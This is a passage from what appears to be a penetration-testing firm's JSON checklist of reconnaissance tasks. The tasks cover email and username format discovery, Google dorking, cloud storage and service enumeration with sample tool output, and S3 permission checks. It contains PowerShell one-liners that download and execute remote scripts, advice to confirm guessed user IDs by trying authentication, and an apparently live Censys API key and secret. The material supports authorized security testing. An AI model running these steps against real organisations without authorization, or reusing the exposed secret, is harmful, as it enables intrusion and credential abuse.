						"instructions": "<h2>Instructions</h2><p>Determine the company's email address format.</p><h3>Tips</h3><p>Using the employee list you can usually infer a valid email address:</p><ul><li><p>First.last@company.com, F.last@company.com, Firstlast@company.com</p></li><li><p>If you can identify a unique text from the company email footer you can use that as a good dork to find email address and actual emails posted to different sites on the internet.</p></li><li><p>Consider reviewing emails registered to company owned IP blocks and domains.</p></li></ul><p>This site may be able to provide guidance if you are stuck:</p><pre><code>https://www.email-format.com</code></pre>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17063368,
							"uid": "6f875ea7-643e-e811-80fe-ecf4bbd04073",
							"name": "General Information - Identified Email Address Format",
							"description": "<p>Determine the format of the company's email addresses.</p><p>Tips</p><p>Using the employee list you can usually infer a valid email address:</p><ul><li><p>First.last@company.com, F.last@company.com, Firstlast@company.com</p></li><li><p>If you can identify a unique text from the company email footer you can use that as a good dork to find email address and actual emails posted to different sites on the internet.?</p></li></ul>",
							"severityId": -2,
							"businessImpact": "<p>Email addresses could potentially be used future attacks such as social engineering and email phishing.</p>",
							"sourceIdentifier": "M:13b82758-a0bf-4e49-8731-25ac6c3f7f5d",
							"verificationInstructions": "<p>Determine the format of the company's email addresses.</p><p>Tips</p><p>Using the employee list you can usually infer a valid email address:</p><ul><li><p>First.last@company.com, F.last@company.com, Firstlast@company.com</p></li><li><p>If you can identify a unique text from the company email footer you can use that as a good dork to find email address and actual emails posted to different sites on the internet.</p></li><li><p>Consider reviewing emails registered to company owned IP blocks and domains.</p></li></ul><p>This site may be able to provide guidance if you are stuck:</p><p>https://www.email-format.com</p>",
							"references": "",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Remediation may not be necessary depending on how the email list was constructed.</p>"
						},
						"ordinal": 6,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "a5c6989c-0f33-49d4-865a-b68196dd12b2",
						"name": "Usernames - Determine Format",
						"instructions": "<h2>Instructions</h2><p>Determine the company's username format. Try to determine what the domain user format is.</p><h3><strong>User IDs Tips</strong></h3><ul><li><p>Most companies base user IDs on the employee's first and last names</p></li><li><p>However, many large financial organizations use a letter follow by 4-8 numbers. In some cases this is easier, because we can just generate a list of potential user IDs and test to see if the exist by attempting authentication through different mediums</p></li></ul><h3><strong>Google Dorks</strong></h3><p>Use Google dorks to search for company related files and information. Below are some recommendations. Search for file types on company websites:</p><pre><code>site:companysite.com filetype:config\nsite:companysite.com filetype:txt\nsite:companysite.com filetype:xml\nsite:companysite.com filetype:xls</code></pre><p><strong>Note:</strong> You can get usernames from xls, doc, and pdf files found on company related sites. Looking on forums can also help.</p><h3><strong>Github</strong></h3><p>Follow the github guidlines in the company files category to search Github for usernames and other information.</p><h3><strong>Company Registration Information</strong></h3><p>Consider reviewing emails registered to company owned IP blocks and domains.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17064435,
							"uid": "01960436-3910-e911-810c-ecf4bbd04083",
							"name": "General Information - Identified Username Format",
							"description": "<p>Try to determine what the domain user format is.</p><p><strong>User IDs Tips</strong></p><ul><li><p>Most companies base user IDs on the employee's first and last names</p></li><li><p>However, many large financial organizations use a letter follow by 4-8 numbers.  In some cases this is easier, because we can just generate a list of potential user IDs and test to see if the exist by attempting authentication through different mediums</p></li></ul><p><strong>Google Dorks</strong></p><p>Use Google dorks to search for company related files and information.  Below are some recommendations. Search for file types on company websites:</p><pre><code>site:companysite.com filetype:config \nsite:companysite.com filetype:txt\nsite:companysite.com filetype:xml\nsite:companysite.com filetype:xls</code></pre><p>Note: You can get usernames from xls, doc, and pdf files found on company related sites. Looking on forums can also help.</p><p><strong>Github</strong></p><p>Follow the github guidlines in the company files category to search Github for usernames and other information.</p><p><strong>IP and Domain Registration Records</strong></p><p>Review domain and IP registration contact information.</p>",
							"severityId": -2,
							"businessImpact": "<p>Usernames can be used in future technical, physical, and administrative attacks.</p>",
							"sourceIdentifier": "M:a084d7e9-1ad3-4dfe-a9b5-291aea4126d5",
							"verificationInstructions": "<p>Try to determine what the domain user format is.</p><p><strong>User IDs Tips</strong></p><ul><li><p>Most companies base user IDs on the employee's first and last names</p></li><li><p>However, many large financial organizations use a letter follow by 4-8 numbers.  In some cases this is easier, because we can just generate a list of potential user IDs and test to see if the exist by attempting authentication through different mediums</p></li></ul><p><strong>Google Dorks</strong></p><p>Use Google dorks to search for company related files and information.  Below are some recommendations. Search for file types on company websites:</p><pre><code>site:companysite.com filetype:config \nsite:companysite.com filetype:txt\nsite:companysite.com filetype:xml\nsite:companysite.com filetype:xls</code></pre><p>Note: You can get usernames from xls, doc, and pdf files found on company related sites. Looking on forums can also help.</p><p><strong>Github</strong></p><p>Follow the github guidlines in the company files category to search Github for usernames and other information.</p><p><strong>Company Registration Information</strong></p><p>Consider reviewing emails registered to company owned IP blocks and domains.</p>",
							"references": "",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Depending on the source of the information and content, remediation steps may not be necessary.</p>"
						},
						"ordinal": 7,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "d6c2c632-b73c-442d-840c-50d71671a305",
						"name": "Upload List of Employees [External Documents]",
						"instructions": "<h2>Instructions</h2><p>1. Upload a list of the enumerated employees to the External Documents section of the Platform project.</p><p>2. Please place contents in a well labeled .csv or .xls document.</p><p>3. When possible include the domain, employee name, and user name.</p><p>4. Make sure to publish it so it is visible to the client in Track.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 8,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "d54ebab4-7d8f-41c0-9a68-170e35dc664a",
						"name": "Additional OPTIONAL or PENDING items",
						"instructions": "<p>Additional options are available which may still be pending further review or testing; or may have account or API access requirements that has not been built into process yet. Also, these optional dynamic checklists may include testing instructions related to older technologies or data sets that are not often relevant in modern day-to-day process.<br><br>To add these items to the checklist, mark this task as vulnerable.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 9,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 5,
				"collapsed": true
			},
			{
				"uid": "6c15ff4e-564f-49dd-9a22-e3ae804b0697",
				"name": "Reconnaissance: Cloud Platforms",
				"description": "",
				"type": 1,
				"tasks": [
					{
						"uid": "6b8c37a6-cd7f-4956-a33c-59c2028c7b49",
						"name": "Cloud Service Discovery - cloud_enum_auth (AWS,Azure,GCP) [ExPowerPen]",
						"instructions": "<p>Note: This tool automates discovery for Azure, AWS, and Google cloud resources.</p><h2>Instructions</h2><p>Review the IP spaces associated with their environment and note if AWS, Azure, or Google cloud is used.</p><p>Also review the check in the company information category and update this if there is any AWS, Azure, or Google cloud usage.</p><h2>Variation: cloud_enum.py</h2><p>Reference: <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://github.com/NetSPI/cloud_enum_auth\">https://github.com/NetSPI/cloud_enum_auth</a></p><p>This is a modified version of cloud_enum which supports AWS authentication to get around rate limiting. This is added into ExPowerPen and should be configured with your AWS key in the ExPowerPen configuration. Manual instructions for running the tool are below.</p><p>1. Download cloud_enum.py from <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://github.com/NetSPI/cloud_enum_auth\">https://github.com/NetSPI/cloud_enum_auth</a> and follow the installation instructions. The authenticated version supports similar usage as other tooling, so you should be able to reference your --profile for your AWS key as shown in the below command.</p><p>2. Run the following command.</p><pre><code>python3 cloud_enum.py -k netspi -ns 1.1.1.1 --profile expenprofile\n\n##########################\n        cloud_enum\n   github.com/initstring\n##########################\n\n\nKeywords:    netspi\nMutations:   /home/ncroy/tools/cloud_enum/enum_tools/fuzz.txt\nBrute-list:  /home/ncroy/tools/cloud_enum/enum_tools/fuzz.txt\n\n[+] Mutations list imported: 242 items\n[+] Mutated results: 1453 items\n<strong>[TRUNCATED]</strong>\n++++++++++++++++++++++++++\n       azure checks\n++++++++++++++++++++++++++\n\n[+] Checking for Azure Storage Accounts\n[*] Brute-forcing a list of 471 possible DNS names\n    [!] DNS Timeout on bigtablenetspi.blob.core.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspibilling.blob.core.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on eventsnetspi.blob.core.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspinet.blob.core.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on netnetspi.blob.core.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on opsnetspi.blob.core.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspistats.blob.core.windows.net. Investigate if there are many of these.\n  HTTP-OK Storage Account: http://netspi.blob.core.windows.net/\n  HTTP-OK Storage Account: http://netspistorage.blob.core.windows.net/\n\n Elapsed time: 00:00:39\n\n[*] Checking 2 accounts for status before brute-forcing\n[*] Brute-forcing container names in 2 storage accounts\n[*] Brute-forcing 213 container names in netspistorage.blob.core.windows.net\n[*] Brute-forcing 213 container names in netspi.blob.core.windows.net\n\n<strong>[TRUNCATED]</strong>\n++++++++++++++++++++++++++\n      amazon checks\n++++++++++++++++++++++++++\n\n[+] Checking for S3 buckets\n  Protected S3 Bucket: http://netspi.s3.amazonaws.com/\n  Protected S3 Bucket: http://netspibackups.s3.amazonaws.com/\n  Protected S3 Bucket: http://netspifiles.s3.amazonaws.com/\n  Protected S3 Bucket: http://netspi-templates.s3.amazonaws.com/\n  Protected S3 Bucket: http://netspitest.s3.amazonaws.com/\n\n[+] Checking for AWS Apps\n[*] Brute-forcing a list of 1453 possible DNS names\n    [!] DNS Timeout on 3netspi.awsapps.com. Investigate if there are many of these.\n    [!] DNS Timeout on netspi-appspot.awsapps.com. Investigate if there are many of these.\n    [!] DNS Timeout on appspot.netspi.awsapps.com. Investigate if there are many of these.\n    [!] DNS Timeout on netspi-compute.awsapps.com. Investigate if there are many of these.\n    [!] DNS Timeout on developer.netspi.awsapps.com. Investigate if there are many of these.\n    [!] DNS Timeout on es.netspi.awsapps.com. Investigate if there are many of these.\n    [!] DNS Timeout on netspi-graphite.awsapps.com. Investigate if there are many of these.\n    [!] DNS Timeout on k8s-netspi.awsapps.com. Investigate if there are many of these.\n    [!] DNS Timeout on mobile-netspi.awsapps.com. Investigate if there are many of these.\n    [!] DNS Timeout on preview-netspi.awsapps.com. Investigate if there are many of these.\n    [!] DNS Timeout on saas.netspi.awsapps.com. Investigate if there are many of these.\n    [!] DNS Timeout on netspi.splunk.awsapps.com. Investigate if there are many of these.\n    [!] DNS Timeout on tempnetspi.awsapps.com. Investigate if there are many of these.\n    [!] DNS Timeout on websitenetspi.awsapps.com. Investigate if there are many of these.\n  AWS App Found:: https://netspi.awsapps.com\n  AWS App Found:: https://netspi2.awsapps.com\n  AWS App Found:: https://netspi3.awsapps.com\n  AWS App Found:: https://netspitest.awsapps.com\n\n<strong>[TRUNCATED]</strong>\n++++++++++++++++++++++++++\n      google checks\n++++++++++++++++++++++++++\n\n[+] Checking for Google buckets\n\n Elapsed time: 00:02:06\n\n[+] Checking for Google Firebase Realtime Databases\n\n Elapsed time: 00:03:58\n\n[+] Checking for Google App Engine apps\n\n Elapsed time: 00:03:01\n\n[+] Checking for project/zones with Google Cloud Functions.\n[*] Testing across 1 regions defined in the config file\n\n Elapsed time: 00:04:27\n\n\n[+] All done, happy hacking!\n<strong>[TRUNCATED]</strong></code></pre><p><strong>\n\nPublic tool for reference: </strong>https://github.com/initstring/cloud_enum</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "4d499b86-8ae5-41f2-a49c-b360f7d3e03c",
						"name": "Cloud Service Discovery - CloudFlare [ExPowerPen]",
						"instructions": "<h2>Instructions</h2><p>Review the IP spaces associated with their environment and note if CloudFlare is used.</p><p>Also review the check in the company information category and update this if there is any CloudFlare usage.</p><h2>Variation: CloudFail</h2><p>1. Download from https://github.com/m0rtem/CloudFail and follow installation instructions.</p><pre><code>git clone https://github.com/m0rtem/CloudFail.git</code></pre><p>2. Run with the following command.</p><pre><code>python3 cloudfail.py --target seo.com</code></pre><h2>Variation: Automation via CloudFlair</h2><p>1. Download from https://github.com/christophetd/CloudFlair and follow installation instructions.</p><pre><code>git clone https://github.com/christophetd/cloudflair.git</code></pre><p>2. Provide censys API and secret keys.</p><pre><code>API ID: 3432d84a-b671-4f41-82dd-6718c08ee6f0\nAPI Secret: sKRhj62qHYv5UZltK9qRmLbmJlvuv1L5</code></pre><p>3. Run the tool.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "13937ec7-d8d8-4afe-a038-b2165d6b0641",
						"name": "Cloud Service Discovery - Azure [ExPowerPen]",
						"instructions": "<h2>Instructions</h2><p>Review the IP spaces associated with their environment and note if Azure is used.</p><p>Also review the check in the company information category and update this if there is any Azure cloud usage.</p><h2>Variation: Enumeration via Get-FederationEndpoint</h2><p>1. Federation / managed test: This shows you if the domain allows for federated authentication. If so, this may be a spot for credential brute-force attacks.</p><ul><li><p>https://blog.netspi.com/using-powershell-identify-federated-domains/</p></li></ul><pre><code>iex(new-object net.webclient).downloadstring(&quot;https://raw.githubusercontent.com/NetSPI/PowerShell/master/Get-FederationEndpoint.ps1&quot;)\nGet-FederationEndpoint -domain ampf.com </code></pre><p>2. Consider targeting Azure Portal manually, msonline, or the graphing API. Below is a script for automating checks for a group of domains.</p><pre><code>&#35; Import function\niex(new-object net.webclient).downloadstring(&quot;https://raw.githubusercontent.com/NetSPI/PowerShell/master/Get-FederationEndpoint.ps1&quot;); \n\n&#35; Load\n$domains = gc C:\\temp\\domains.txt\n\n&#35; Check domains\n$results = $domains |\nforeach {\n\n Get-FederationEndpoint -domain $_\n}\n\n&#35; Display results\n$results\n\n&#35; Write to file\n$results | export-csv -notypeinformation c:\\temp\\results.csv</code></pre><h2>Variation: Server Enumeration with Invoke-EnumerateAzureSubDomains </h2><p>1. Read the blog below for general usage.</p><ul><li><p>https://blog.netspi.com/enumerating-azure-services/</p></li></ul><p>2. Download and load https://github.com/NetSPI/MicroBurst </p><p>3. Run the function below.</p><p>Example:</p><pre><code>Invoke-EnumerateAzureSubDomains -Base test12345678 -Verbose\n\nzurewebsites.net\tApp Services\nscm.azurewebsites.net\tApp Services - Management\np.azurewebsites.net\tApp Services\ncloudapp.net\tApp Services\nfile.core.windows.net\tStorage Accounts-Files\nblob.core.windows.net\tStorage Accounts-Blobs\nqueue.core.windows.net\tStorage Accounts-Queues\ntable.core.windows.net\tStorage Accounts-Tables\nredis.cache.windows.net\tDatabases-Redis\ndocuments.azure.com\tDatabases-Cosmos DB\ndatabase.windows.net\tDatabases-MSSQL\nvault.azure.net\tKey Vaults\nonmicrosoft.com\tMicrosoft Hosted Domain\nmail.protection.outlook.com\tEmail\nsharepoint.com\tSharePoint\nazureedge.net\tCDN\nsearch.windows.net\tSearch Appliance\nazure-api.net\tAPI Services</code></pre><h2>Variation: cloud_enum.py</h2><p>1. Download cloud_enum.py from https://github.com/initstring/cloud_enum and follow the installation instructions.</p><pre><code>git clone https://github.com/initstring/cloud_enum.git</code></pre><p>2. Run the following command.</p><pre><code>python3 cloud_enum.py -k netspi -ns 1.1.1.1\n\n&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;\n        cloud_enum\n   github.com/initstring\n&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;\n\n\nKeywords:    netspi\nMutations:   /home/ncroy/tools/cloud_enum/enum_tools/fuzz.txt\nBrute-list:  /home/ncroy/tools/cloud_enum/enum_tools/fuzz.txt\n\n[+] Mutations list imported: 242 items\n[+] Mutated results: 1453 items\n\n<strong>[TRUNCATED]</strong>\n++++++++++++++++++++++++++\n       azure checks\n++++++++++++++++++++++++++\n\n[+] Checking for Azure Storage Accounts\n[&#42;] Brute-forcing a list of 471 possible DNS names\n    [!] DNS Timeout on bigtablenetspi.blob.core.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspibilling.blob.core.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on eventsnetspi.blob.core.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspinet.blob.core.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on netnetspi.blob.core.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on opsnetspi.blob.core.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspistats.blob.core.windows.net. Investigate if there are many of these.\n  HTTP-OK Storage Account: http://netspi.blob.core.windows.net/\n  HTTP-OK Storage Account: http://netspistorage.blob.core.windows.net/\n\n Elapsed time: 00:00:39\n\n[&#42;] Checking 2 accounts for status before brute-forcing\n[&#42;] Brute-forcing container names in 2 storage accounts\n[&#42;] Brute-forcing 213 container names in netspistorage.blob.core.windows.net\n[&#42;] Brute-forcing 213 container names in netspi.blob.core.windows.net\n\n Elapsed time: 00:00:39\n\n[+] Checking for Azure Websites\n[&#42;] Brute-forcing a list of 1453 possible DNS names\n  Registered Azure Website DNS Name: netspi.azurewebsites.net\n    [!] DNS Timeout on netspi2.azurewebsites.net. Investigate if there are many of these.\n    [!] DNS Timeout on aenetspi.azurewebsites.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspi-bak.azurewebsites.net. Investigate if there are many of these.\n    [!] DNS Timeout on club-netspi.azurewebsites.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspi.cluster.azurewebsites.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspi.emails.azurewebsites.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspi.graphite.azurewebsites.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspikube.azurewebsites.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspi.mysql.azurewebsites.net. Investigate if there are many of these.\n    [!] DNS Timeout on production-netspi.azurewebsites.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspiproducts.azurewebsites.net. Investigate if there are many of these.\n    [!] DNS Timeout on static-netspi.azurewebsites.net. Investigate if there are many of these.\n  Registered Azure Website DNS Name: netspitest.azurewebsites.net\n  Registered Azure Website DNS Name: netspi-test.azurewebsites.net\n    [!] DNS Timeout on netspi.troposphere.azurewebsites.net. Investigate if there are many of these.\n\n Elapsed time: 00:01:19\n\n[+] Checking for Azure Databases\n[&#42;] Brute-forcing a list of 1453 possible DNS names\n    [!] DNS Timeout on 1.netspi.database.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspiamazon.database.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspi-beta.database.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspi-com.au.database.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on dbnetspi.database.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on endpoints.netspi.database.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on gw-netspi.database.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspildap.database.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on packagesnetspi.database.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on shared.netspi.database.windows.net. Investigate if there are many of these.\n  Registered Azure Database DNS Name: netspi-test.database.windows.net\n\n Elapsed time: 00:01:15\n\n[+] Checking for Azure Virtual Machines\n[&#42;] Testing across 1 regions defined in the config file\n[&#42;] Brute-forcing a list of 1453 possible DNS names\n    [!] DNS Timeout on administratornetspi.eastus.cloudapp.azure.com. Investigate if there are many of these.\n    [!] DNS Timeout on administrator.netspi.eastus.cloudapp.azure.com. Investigate if there are many of these.\n    [!] DNS Timeout on gcp-logs-netspi.eastus.cloudapp.azure.com. Investigate if there are many of these.\n    [!] DNS Timeout on netspipostgres.eastus.cloudapp.azure.com. Investigate if there are many of these.\n    [!] DNS Timeout on netspiproducts.eastus.cloudapp.azure.com. Investigate if there are many of these.\n    [!] DNS Timeout on production-netspi.eastus.cloudapp.azure.com. Investigate if there are many of these.\n    [!] DNS Timeout on netspi-products.eastus.cloudapp.azure.com. Investigate if there are many of these.\n    [!] DNS Timeout on productsnetspi.eastus.cloudapp.azure.com. Investigate if there are many of these.\n\n Elapsed time: 00:00:54\n<strong>[TRUNCATED]</strong></code></pre>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 2,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "603d7af7-01ac-4080-aaa9-48801d664577",
						"name": "Cloud Service Discovery - Digital Ocean",
						"instructions": "<h2>Instructions</h2><p>Review the IP spaces associated with their environment and note if Digital Ocean is used.</p><p>Also review the check in the company information category and update this if there is any Digital Ocean usage.</p><h2>Variation: Automation via spaces_finder.py</h2><p>1. Download https://github.com/appsecco/spaces-finder.</p><pre><code>git clone https://github.com/appsecco/spaces-finder.git</code></pre><p>2. This can be used to identify usage and enumerate Digital Ocean spaces. run the command below.</p><h3>Example:</h3><pre><code>python spaces_finder.py -l domains.txt -g interesting_keywords.txt -D -m 500000 -d 1 -t 5</code></pre>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 3,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "d29616a3-e305-43bd-b607-a5ba5099a9fa",
						"name": "Excessive Privileges - AWS S3 Bucket - Manual Review",
						"instructions": "<h2><strong>Instructions </strong></h2><p>See verification instructions and add the linked finding if applicable.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17064031,
							"uid": "5401097d-84ba-e811-8104-ecf4bbd04073",
							"name": "Excessive Privileges - AWS S3 Bucket - List Permission",
							"description": "<p>AWS S3 is a scalable cloud storage service that allows users to store and retrieve data from file storage units known as buckets. Misconfigured buckets will sometimes allow directory listing, revealing the full file structure when the bucket is directly browsed to.</p>",
							"severityId": 2,
							"businessImpact": "<p>Risks associated with an attacker discovering a directory listing on the S3 bucket depend upon what type of what types of files are in the S3 bucket and what kind of permissions unauthorized users have to those files.</p>",
							"sourceIdentifier": "M:eeea4113-6c6d-4461-a664-5b5e455ca671",
							"verificationInstructions": "<p><strong><span style=\"color: #DB2719\">Note: This finding should be used for NetPens, not CPens</span></strong></p><h2><strong>Instructions </strong></h2><p>1. Identify bucket names by scanning in scope application for references, Google dorking for references, and guessing/permutating names.</p><p>2. Check permissions on the bucket to see if listing or read/write is allowed, and for which type of user (authenticated users or all/unauthenticated users).</p><p>3. Review files in the bucket for sensitive data.</p><h2>Variation: Bucket Enumeration - cloud_enum</h2><p>Reference: https://github.com/initstring/cloud_enum</p><p>1. Download cloud_enum and follow the installation instructions in the repository.</p><pre><code>git clone https://github.com/initstring/cloud_enum.git</code></pre><p>2. Run the following (or similar) command.</p><pre><code>python3 cloud_enum.py -k netspi -ns 1.1.1.1 --disable-azure --disable-gcp\n\n&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;\n        cloud_enum\n   github.com/initstring\n&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;\n\n\nKeywords:    netspi\nMutations:   /home/ncroy/tools/cloud_enum/enum_tools/fuzz.txt\nBrute-list:  /home/ncroy/tools/cloud_enum/enum_tools/fuzz.txt\n\n[+] Mutations list imported: 242 items\n[+] Mutated results: 1453 items\n\n++++++++++++++++++++++++++\n      amazon checks\n++++++++++++++++++++++++++\n\n[+] Checking for S3 buckets\n  Protected S3 Bucket: http://netspi.s3.amazonaws.com/\n  Protected S3 Bucket: http://netspibackups.s3.amazonaws.com/\n  Protected S3 Bucket: http://netspifiles.s3.amazonaws.com/\n  Protected S3 Bucket: http://netspi-templates.s3.amazonaws.com/\n  Protected S3 Bucket: http://netspitest.s3.amazonaws.com/\n\n Elapsed time: 00:04:06\n<strong>[TRUNCATED]</strong></code></pre><p>3. Review the tool output to see if it was able to determine that any of the buckets were open.</p><h2><strong>Variation: Bucket Enumeration - Web Application Scanning</strong></h2><p>Reference: https://github.com/NetSPI/Burp-Extensions-Private/tree/master/FindCloudServiceRefs</p><p>1. Use Burp to scan in scope web applications with the extension above installed to find AWS S3 bucket references as time allows.</p><h2><strong>Variation: Bucket Enumeration - </strong>buckets.grayhatwarfare.com</h2><p>1. Navigate to buckets.grayhatwarfare.com and search for buckets using the company, domain, and known application names.</p><p>2. Focus on buckets, and deprioritize file names.</p><h2><strong>Variation: Bucket Enumeration - Google Dorking</strong></h2><p>1. Perform Google search to find potential S3 bucket names for the client, domains, and apps as time allows.  </p><h3><strong>Example:</strong></h3><pre><code>clientname inbody:s3.amazonaws.com </code></pre><h2><strong>Variation: Bucket and File Enumeration: Get-PublicAwsS3BucketList</strong></h2><p>If you're unauthenticated and have the bucket name you can attempt to get a list of accessible files using the script below. It can be used to guess S3 buckets that could be associated with a client. The script does support importing a list of bucket names from a file and can perform basic permutations of provided bucket names.</p><p><strong>Note:</strong> Target bucket names that map to the company name, company applications, and internal/external domain names.</p><p>1. Load the script into your PowerShell session.</p><pre><code>iex(new-object net.webclient).downloadstring(&quot;https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/AWS/Get-PublicAwsS3BucketList.ps1&quot;)</code></pre><p>2a. Target single company name, domain, or app.  For domains, consider dropping the &quot;.com&quot;.</p><pre><code>Get-PublicAwsS3BucketListFromDomains -S3Bucket &quot;acme&quot; -Verbose</code></pre><p>2b. Target single company name, domain, or app.  For domains, consider dropping the &quot;.com&quot;, but also run permutations.</p><pre><code>Get-PublicAwsS3BucketListFromDomains -S3Bucket &quot;ameriprise&quot; -Verbose -Permutate</code></pre><p>2c. Target known bucket for listing.</p><pre><code> Get-PublicAwsS3BucketList -S3BucketName &quot;<a href='http://hq-sandbox.us-east-1.subs.static.arcpublishing.com/'>hq-sandbox.us-east-1.subs.static.acme.com</a>&quot; -Verbose </code></pre><p>To store results to a variation use the command below:</p><pre><code>$Results = Get-PublicAwsS3BucketListFromDomains -S3Bucket &quot;acme&quot; -Verbose -Permutate</code></pre><p>3. View the results.</p><pre><code>$Results</code></pre><p>4. Write the results to a file and upload it to the Documents section in the Resolve project.</p><pre><code>$Results | Export-CSV -NoTypeInformation s3-list-domains.csv</code></pre><p>5.  If any of the enumerated buckets allow S3 key listing, add this finding and show the process used to list the keys. Include a list of all buckets that provide list permissions to everyone.  If sensitive data is found add separate high findings calling out unauthenticated access to sensitive data.</p><p>6. Review available listings for data targets. Group the accessible keys based on filetype, and target outliers and interesting file types such as configurations files.</p><pre><code>$Results | Where-Object FileType -NotLike &quot;&#42;/&#42;&quot; | Group-Object FileType | Select Name,Count | Sort-Object count -Descending</code></pre><h2>Checking Permissions/Files After Bucket Enumeration</h2><p><strong>Authenticated Test</strong></p><p>You can use the cli command below if you have AWS account credentials for the account that owns the bucket:</p><pre><code>aws s3 ls s3://bucketnamehere</code></pre><p>Also, you can use scout or weirdAAL with your AWS SSO or acquired keys.</p><ul><li><p>https://github.com/nccgroup/Scout2</p></li><li><p>https://github.com/carnal0wnage/weirdAAL</p></li><li><p>https://github.com/carnal0wnage/weirdAAL/wiki</p></li><li><p>https://github.com/cyberark/SkyArk</p></li></ul><p><strong>Note:</strong> Most of the time you will not have AWS credentials, so below are some instructions for finding S3 buckets and files and checking permissions using your own NetSPI AWS credentials, or completely anonymously.</p><p><strong>Authenticated Test</strong></p><p><a href='https://s3check.netspiaws.com'>https://s3check.netspiaws.com</a></p><p>Reference Code: https://github.com/NetSPI/S3PermissionChecker</p><p>Use the S3PermissionChecker website on each bucket to determine permissions. The tool authenticates you to NetSPI's AWS instance, and then checks permissions to determine if the bucket is entirely public, or if certain permissions are misconfigured to permit authenticated users access even if they're not part of the AWS account that owns the bucket. The standalone GitHub tool can be used if the website is inaccessible for any reason. Follow the setup instructions in the repository.</p><p><strong>Unauthenticated Test: Manual</strong></p><p>If you have already identified an S3 bucket, you can check for list permissions by browsing to either:</p><p>https://[subdomain].s3.amazonaws.com </p><p>-or-</p><p>https://[subdomain].s3.amazonaws.com?max-keys=1000&amp;list-type=2</p><h2>Additional Reporting</h2><p>If sensitive data is found during the bucket enumeration process, also add one of the findings below (in addition to the finding documenting the S3 bucket permission issues):</p><ul><li><p>Sensitive Information Disclosure - Cleartext Password</p></li><li><p>Sensitive Information Disclosure - Publicly Available Resources</p></li></ul>",
							"references": "<ul><li>https://aws.amazon.com/articles/5050/</li></ul>",
							"exploitInstructions": "",
